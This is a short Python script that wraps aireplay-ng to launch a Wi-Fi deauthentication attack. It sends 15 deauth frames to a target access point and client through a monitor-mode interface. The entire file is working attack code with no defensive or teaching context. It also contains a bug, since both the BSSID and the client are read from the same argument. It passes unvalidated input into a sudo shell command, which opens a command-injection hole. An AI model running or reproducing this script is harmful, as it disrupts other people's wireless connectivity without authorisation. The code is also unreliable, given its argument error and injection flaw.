import sys
import os

bssid = sys.argv[1]
client = sys.argv[1]

os.system("sudo aireplay-ng -0 15 -a  " + bssid + " -c " + client + " wlan0mon")
